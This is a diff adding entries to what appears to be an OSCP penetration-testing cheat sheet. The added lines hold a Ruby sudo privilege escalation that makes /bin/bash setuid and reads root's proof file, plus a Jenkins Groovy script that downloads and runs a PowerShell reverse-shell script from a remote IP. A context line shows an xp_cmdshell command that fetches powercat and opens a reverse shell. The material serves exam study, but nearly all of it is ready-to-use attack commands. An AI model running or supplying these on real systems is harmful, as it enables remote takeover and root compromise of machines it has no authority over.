@@ -1043,6 +1043,21 @@ listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
 EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.108.147:443/powercat.ps1''))"; powercat -c 10.10.108.147 -p 4444 -e powershell';
 ```
 
+## ruby privilege escalation
+![image](https://github.com/nuricheun/OSCP/assets/14031269/75d4a5e9-a057-4966-a367-961f2de8e3f3)
+```bash
+echo 'system("chmod +s /bin/bash")' > app.rb
+sudo -u root /usr/bin/ruby /home/andrew/app/app.rb
+bash -p
+cat /root/proof.txt
+```
+
+## jenkins grooby 
+```bash
+def command = “powershell -c iex(new-object net.webclient).downloadstring(‘http://192.168.45.176:80/Invoke-PowerShellTcp.ps1')"
+def proc = command.execute()
+println(proc.in.text)
+```
 
 
 
